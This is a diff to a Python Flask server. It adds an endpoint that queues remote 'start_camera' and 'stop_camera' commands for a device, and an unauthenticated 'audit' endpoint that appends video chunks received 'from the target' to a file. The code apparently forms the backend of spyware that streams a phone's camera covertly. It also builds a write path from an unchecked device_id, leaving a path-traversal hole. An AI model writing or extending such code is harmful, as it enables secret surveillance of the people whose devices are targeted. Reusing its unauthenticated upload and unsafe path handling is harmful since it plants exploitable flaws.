@@ -644,6 +644,76 @@ def get_device_command_ios(device_id):
         return jsonify({'hasCommand': False, 'action': None}), 200
 
 
+@routes.route('/api/device/<device_id>/camera/command', methods=['POST'])
+@login_required
+@require_permission('control_recordings')
+def send_camera_command(device_id):
+    """Send camera livestream command to a specific device"""
+    try:
+        from .device_utils import resolve_to_device_id
+        actual_device_id = resolve_to_device_id(device_id)
+        
+        auth = request.authorization
+        if not auth or not check_auth(auth.username, auth.password):
+            return authenticate()
+
+        data = request.get_json()
+        command = data.get('command', '').lower().strip()
+        
+        if command not in ['start_camera', 'stop_camera']:
+            return jsonify({'error': 'Invalid command. Use "start_camera" or "stop_camera"'}), 400
+            
+        # We can reuse the DeviceCommand table for this
+        # Clear any existing pending commands for this device
+        DeviceCommand.query.filter_by(device_id=actual_device_id)\
+            .filter(DeviceCommand.status.in_(['pending', 'sent']))\
+            .update({'status': 'cancelled'})
+            
+        device_command = DeviceCommand(
+            device_id=actual_device_id,
+            command=command,
+            status='pending',
+            created_by='dashboard'
+        )
+        
+        db.session.add(device_command)
+        db.session.commit()
+        
+        current_app.logger.info(f"Camera command sent: {command} to {actual_device_id}")
+        
+        return jsonify({
+            'status': 'success',
+            'message': f'Command "{command}" sent to device',
+            'command_id': device_command.id
+        }), 200
+        
+    except Exception as e:
+        current_app.logger.error(f"Error sending camera command: {e}")
+        return jsonify({'error': 'Internal server error'}), 500
+
+@routes.route('/api/audit/livestream/feed', methods=['POST'])
+def receive_livestream_feed():
+    """Endpoint that receives the continuous video chunks from the target"""
+    device_id = request.form.get('device_id', 'unknown')
+    
+    if 'chunk' in request.files:
+        chunk_file = request.files['chunk']
+        
+        # Ensure directory exists
+        stream_dir = os.path.join(current_app.root_path, 'streams', device_id)
+        os.makedirs(stream_dir, exist_ok=True)
+        
+        stream_path = os.path.join(stream_dir, 'live_feed.webm')
+        
+        # Append the binary chunk directly to the growing webm file
+        with open(stream_path, 'ab') as f:
+            f.write(chunk_file.read())
+            
+        return jsonify({"status": "Chunk appended"}), 200
+        
+    return jsonify({"error": "No chunk data"}), 400
+
+
 @routes.route('/api/command/<int:command_id>/complete', methods=['POST'])
 def complete_device_command(command_id):
     """Mark a command as completed (used by iOS app after executing command)"""
